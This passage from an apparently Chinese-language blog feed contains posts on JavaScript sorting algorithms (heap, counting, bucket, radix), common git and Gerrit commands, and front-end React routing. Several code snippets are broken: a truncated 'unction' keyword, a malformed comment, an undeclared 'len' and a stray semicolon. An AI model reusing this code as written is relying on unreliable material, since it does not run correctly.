punctuation">(</span>arr<span class="token punctuation">,</span> largest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">heapSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">buildMaxHeap</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        len<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="计数排序（Counting-Sort）"><a href="#计数排序（Counting-Sort）" class="headerlink" title="计数排序（Counting Sort）"></a>计数排序（Counting Sort）</h2><p>计数排序不是基于比较的排序算法，其核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><h3 id="8-1-算法描述"><a href="#8-1-算法描述" class="headerlink" title="8.1 算法描述"></a>8.1 算法描述</h3><ul><li>找出待排序的数组中最大和最小的元素；</li><li>统计数组中每个值为i的元素出现的次数，存入数组C的第i项；</li><li>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）；</li><li>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。</li></ul><h3 id="8-2-动图演示"><a href="#8-2-动图演示" class="headerlink" title="8.2 动图演示"></a>8.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf8.gif" alt="img"></p><h3 id="8-3-代码实现"><a href="#8-3-代码实现" class="headerlink" title="8.3 代码实现"></a>8.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">countingSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> bucket <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>maxValue <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        sortedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        arrLen <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        bucketLen <span class="token operator">=</span> maxValue <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bucket<span class="token punctuation">[</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        bucket<span class="token punctuation">[</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> bucketLen<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>sortedIndex<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-4-算法分析"><a href="#8-4-算法分析" class="headerlink" title="8.4 算法分析"></a>8.4 算法分析</h3><p>计数排序是一个稳定的排序算法。当输入的元素是 n 个 0到 k 之间的整数时，时间复杂度是O(n+k)，空间复杂度也是O(n+k)，其排序速度快于任何比较排序算法。当k不是很大并且序列比较集中时，计数排序是一个很有效的排序算法。</p><h2 id="桶排序（Bucket-Sort）"><a href="#桶排序（Bucket-Sort）" class="headerlink" title="桶排序（Bucket Sort）"></a>桶排序（Bucket Sort）</h2><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排）。</p><h3 id="9-1-算法描述"><a href="#9-1-算法描述" class="headerlink" title="9.1 算法描述"></a>9.1 算法描述</h3><ul><li>设置一个定量的数组当作空桶；</li><li>遍历输入数据，并且把数据一个一个放到对应的桶里去；</li><li>对每个不是空的桶进行排序；</li><li>从不是空的桶里把排好序的数据拼接起来。 </li></ul><h3 id="9-2-图片演示"><a href="#9-2-图片演示" class="headerlink" title="9.2 图片演示"></a>9.2 图片演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf9.png" alt="img"></p><h3 id="9-3-代码实现"><a href="#9-3-代码实现" class="headerlink" title="9.3 代码实现"></a>9.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js">unction <span class="token function">bucketSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> bucketSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> i<span class="token punctuation">;</span>    <span class="token keyword">var</span> minValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> maxValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> minValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>          minValue <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 输入数据的最小值</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>          maxValue <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 输入数据的最大值</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶的初始化</span>    <span class="token keyword">var</span> DEFAULT_BUCKET_SIZE <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 设置桶的默认数量为5</span>    bucketSize <span class="token operator">=</span> bucketSize <span class="token operator">||</span> DEFAULT_BUCKET_SIZE<span class="token punctuation">;</span>    <span class="token keyword">var</span> bucketCount <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>maxValue <span class="token operator">-</span> minValue<span class="token punctuation">)</span> <span class="token operator">/</span> bucketSize<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> buckets <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>bucketCount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> buckets<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buckets<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 利用映射函数将数据分配到各个桶中</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buckets<span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> minValue<span class="token punctuation">)</span> <span class="token operator">/</span> bucketSize<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    arr<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> buckets<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">insertionSort</span><span class="token punctuation">(</span>buckets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 对每个桶进行排序，这里使用了插入排序</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> buckets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>buckets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-4-算法分析"><a href="#9-4-算法分析" class="headerlink" title="9.4 算法分析"></a>9.4 算法分析</h3><p>桶排序最好情况下使用线性时间O(n)，桶排序的时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然，桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。 </p><h2 id="基数排序（Radix-Sort）"><a href="#基数排序（Radix-Sort）" class="headerlink" title="基数排序（Radix Sort）"></a>基数排序（Radix Sort）</h2><p>基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p><h3 id="10-1-算法描述"><a href="#10-1-算法描述" class="headerlink" title="10.1 算法描述"></a>10.1 算法描述</h3><ul><li>取得数组中的最大数，并取得位数；</li><li>arr为原始数组，从最低位开始取每个位组成radix数组；</li><li>对radix进行计数排序（利用计数排序适用于小范围数的特点）；</li></ul><h3 id="10-2-动图演示"><a href="#10-2-动图演示" class="headerlink" title="10.2 动图演示"></a>10.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf10.gif" alt="img"></p><h3 id="10-3-代码实现"><a href="#10-3-代码实现" class="headerlink" title="10.3 代码实现"></a>10.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">/</span> LSD Radix Sort<span class="token keyword">var</span> counter <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">radixSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> maxDigit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> mod <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> dev <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxDigit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> dev <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> mod <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> bucket <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> mod<span class="token punctuation">)</span> <span class="token operator">/</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">var</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> counter<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> value <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>counter<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">=</span> counter<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      arr<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-4-算法分析"><a href="#10-4-算法分析" class="headerlink" title="10.4 算法分析"></a>10.4 算法分析</h3><p>基数排序基于分别排序，分别收集，所以是稳定的。但基数排序的性能比桶排序要略差，每一次关键字的桶分配都需要O(n)的时间复杂度，而且分配之后得到新的关键字序列又需要O(n)的时间复杂度。假如待排数据可以分为d个关键字，则基数排序的时间复杂度将是O(d*2n) ，当然d要远远小于n，因此基本上还是线性级别的。</p><p>基数排序的空间复杂度为O(n+k)，其中k为桶的数量。一般来说n&gt;&gt;k，因此额外空间需要大概n个左右。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="2018/08/12/gitbase/"/>
      <url>2018/08/12/gitbase/</url>
      
        <content type="html"><![CDATA[<h2 id="一、git常用指令"><a href="#一、git常用指令" class="headerlink" title="一、git常用指令"></a>一、git常用指令</h2><p>1、git显示全部分支</p><blockquote><p>git branch //显示本地分支<br>git branch -a //显示远程分支</p></blockquote><p>2、git创建分支</p><blockquote><p>git branch 分支名</p></blockquote><p>3、切换分支</p><blockquote><p>git checkout 分支名<br>git checkout  -b 分支名 若分支不存在，则创建它</p></blockquote><p>4、删除分支</p><blockquote><p>git branch -d 分支名<br>-d 当分支已经合并到主干后删除<br>-D无论如何都删除分支</p></blockquote><p>5、合并分支</p><blockquote><p>git merge 分支名</p></blockquote><p>6、撤销前一次commit</p><blockquote><p>git revert HEAD</p></blockquote><p>7、撤销所有本地修改</p><blockquote><p>git reset –hard</p></blockquote><p>8、撤销所有本地到上一次修改</p><blockquote><p>git reset –hard HEAD^</p></blockquote><p>9、撤销上一次commit，将commit的文件撤回暂存区</p><blockquote><p>git reset –soft HEAD^<br>要是想撤销到上上次，就是HEAD^^  ,以此类推。<br>git revert 是撤销某次操作，此次操作之前的commit都会被保留<br>git reset 是撤销某次提交，但是此次之后的修改都会被退回到暂存区</p></blockquote><p>10、将此次更新文件并入到上次commit的记录中，不新添加commit</p><blockquote><p>git commit -amend</p></blockquote><h2 id="二、git进阶"><a href="#二、git进阶" class="headerlink" title="二、git进阶"></a>二、git进阶</h2><p>1、git tag</p><blockquote><p>可以将某个具体的版本打上一个标签，这样你就不需要记忆复杂的版本号哈希值了， 例如你可以使用 ‘git tag revert_version bbaf6fb5060b4875b18ff9ff637ce118256d6f20’来标记这个被你还原的版本，那么以后你想查看该版本时，就可以使用 revert_version标签名，而不是哈希值了</p></blockquote><p>2、git stash</p><blockquote><p>把所有本地修改都放到暂存区</p></blockquote><p>3、git stash pop</p><blockquote><p>把git stash放到暂存区的代码拿出来</p></blockquote><p>tips：</p><ol><li>使用git stash保存当前的工作现场，那么就可以切换到其他分支进行工作，或者在当前分支上完成其他紧急的工作，比如修订一个bug测试提交。</li><li>如果一个使用了一个git stash，切换到一个分支，且在该分支上的工作未完成也需要保存它的工作现场。再使用gitstash。那么stash 队列中就有了两个工作现场。</li><li>可以使用git stash list。查看stash队列。</li><li>如果在一个分支上想要恢复某一个工作现场怎么办：先用git stashlist查看stash队列。确定要恢复哪个工作现场到当前分支。然后用git stash pop stash@{num}。num就是你要恢复的工作现场的编号。</li><li>如果想要清空stash队列则使用git stash clear。</li><li>同时注意使用git stashpop命令是恢复stash队列中的stash@{0}即最上层的那个工作现场。而且使用pop命令恢复的工作现场，其对应的stash在队列中删除。使用git stash apply stash@{num}方法除了不在stash队列删除外其他和git stashpop 完全一样。</li></ol><h2 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h2><p> 1、提交合并失败<br> 查看源文件<br> <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9hYTA2NGZjNzhhYjIzNzY4ODQyMTBkMWMxNTRkNjIzNi94bWxub3RlLzY5RkFGMTkyQzU2NjRCMkZCMTU0RDk5RTc5MzQzOEFFLzc1Nw" alt="这里写图片描述"></p><p>git迷惑之处在于它不知道是把hello world这行放在前面还是把报时功能这段放在前面。<br>修改冲突<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20veXdzL3B1YmxpYy9yZXNvdXJjZS9hYTA2NGZjNzhhYjIzNzY4ODQyMTBkMWMxNTRkNjIzNi94bWxub3RlL0NERDcxMTdFODlFNjRCOTc4Q0E5NkNEMzEyMThEOEE1Lzc1Ng" alt="这里写图片描述"></p><p>重新提交<br>git commit -am “xxx”</p><p>2、解决gerrit冲突<br>解决远程冲突：<br>cd demo以分支为develop为例打开Gerrit有冲突的那个网址，如 <a href="http://192.168.1.33:8080/#/c/16/" target="_blank" rel="noopener">http://192.168.1.33:8080/#/c/16/</a> 找到Download 如下命令，执行<br>git fetch ssh://minggui.li@192.168.1.33:29418/demo refs/changes/16/16/1 &amp;&amp; git checkout FETCH_HEADgit checkout -b new_branch_namegit fetch origingit rebase origin/develop<br>修改冲突文件<br>git add .git rebase –continuegit push origin new_branch_name:refs/for/developgit checkout developgit branch -D new_branch_name不会产生新的changes记录，将原changes记录重新review提交即可，这时在原冲突机器上直接pull会本地冲突，需要git reset –hard HEAD^否则会出现cannot do a partial commit during a merge.最后更新下代码git pull</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端RN路由入门到实战</title>
      <link href="2018/05/04/rnrouter/"/>
      <url>2018/05/04/rnrouter/</url>
      
        <content type="html"><![CDATA[<h2 id="前端路由"><a href="#前端路由" class="headerlink" title="前端路由"></a>前端路由</h2><h3 id="1-1、前言"><a href="#1-1、前言" class="headerlink" title="1.1、前言"></a>1.1、前言</h3><p>开始今天的话题之前，让我们先来了解一下前端路由，Ajax诞生以后，解决了每次用户操作都要向服务器端发起请求重刷整个页面的问题，但随之而来的问题是无法保存Ajax操作状态，浏览器的前进后退功能也不可用，当下流行的两种解决方法是：</p><ul><li>hash  hash原本的作用是为一个很长的文档页添加锚点信息，它自带不改变url刷新页面的功能，所以自然而然被用在记录Ajax操作状态中了</li><li>history  应该说history是主流的解决方案，浏览器的前进后退用的就是这个，它是window对象下的，以前的history提供的方法只能做页面之间的前进后退 如下：</li></ul><h3 id="1-2、history前进后退方法"><a href="#1-2、history前进后退方法" class="headerlink" title="1.2、history前进后退方法"></a>1.2、history前进后退方法</h3><ul><li>histoy.go(number|URL)  可加载历史列表中的某个具体的页面</li><li>history.forward() 可加载历史列表中的下一个 URL</li><li>history.back() 可加载历史列表中的前一个 URL</li></ul><h3 id="1-3、H5新增方法"><a href="#1-3、H5新增方法" class="headerlink" title="1.3、H5新增方法"></a>1.3、H5新增方法</h3><p>为了让history不仅仅能回退到上一个页面，还可以回到上一个操作状态。HTML5新增了三个方法，其中两个是在history对象里的：</p><ul><li>history.pushState(state, title, url)<br>添加一条历史记录， state用于传递参数，可以为空。title是设置历史记录的标题，可以为空。url是历史记录的URL，不可以为空。</li><li>history.replaceState(state, title, url)<br>将history堆栈中当前的记录替换成这里的url，参数同上。</li></ul><h3 id="1-4、window下新增方法"><a href="#1-4、window下新增方法" class="headerlink" title="1.4、window下新增方法"></a>1.4、window下新增方法</h3><p>window.onpopstate() 监听url的变化，会忽略hash的变化（hash变化有一个onhashchange事件），但是前面的两个事件不会触发它。</p><p>总结：</p><p>单页面应用或者Ajax操作记录状态用的就是hash和h5增加的history API，这就是<a href="https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FReactTraining%2Freact-router%2Ftree%2Fmaster%2Fpackages%2Freact-router-dom" target="_blank" rel="noopener">react-router-dom</a> 扩展的路由实现，也是web应用最常用的两种路由</p><h3 id="1-5、react路由"><a href="#1-5、react路由" class="headerlink" title="1.5、react路由"></a>1.5、react路由</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//引入必要的资源包</span><span class="token keyword">import</span> ReactDom <span class="token keyword">from</span> <span class="token string">'react-dom'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Router<span class="token punctuation">,</span> Route<span class="token punctuation">,</span> hashHistory<span class="token punctuation">,</span>IndexRoute<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-router'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//路由页面配置</span>ReactDom<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>     <span class="token operator">&lt;</span>Router history<span class="token operator">=</span><span class="token punctuation">{</span>hashHistory<span class="token punctuation">}</span><span class="token operator">></span>        <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">'/'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>Page<span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>Route<span class="token operator">></span>        <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">'/NewTask'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>NewTask<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">'/Redeem'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>Redeem<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">'/Rule'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>Rule<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>Router<span class="token operator">></span>     <span class="token punctuation">,</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 